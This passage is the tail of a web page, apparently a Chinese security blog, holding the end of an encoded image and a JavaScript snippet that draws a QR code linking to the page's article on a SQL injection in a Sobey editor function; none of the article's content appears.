gOft7Q3Ou+35yA1enpeDvF1DtF7PUSHoHVi9690fWc8BmLRxteewGUgkKnDiKttQnzmnbZchPhW+e6T6xfVIf3ginpW2HvJIb16Hcz1lQ/ih+Cd75y/DOSc3M8/fwJ/bSDeuo53X6L+7oPctp6XF1pTzxVySC2M2PPyqq34U9w+YvU+B3zt668NxMU3fu8E/thAnDhk2n0bEB2C5ld1MPr0Q/ReB2j5/G4MOL5j09vxKGgPwGePJh/9IHn7wcjv6sxD6uSFf2wg1WzH75/AZSBOveNqKX2r/EqH8XbYB0bdevMiXH3mRIgH5mhv0TpRXYT0ueMQn30g3DrRvLzwMpASd7zuBI6BQKYIj/FXtzq7DbNe+kQY99Nr9BWag9SUVqG+wvJUrPKQfj1fNRXq9XwO9Y6QfhA854+BnMX9/LoT2AN53dlPV/4fAAAA///y8m5pAAAABklEQVQDAHR0c8Xu24AjAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 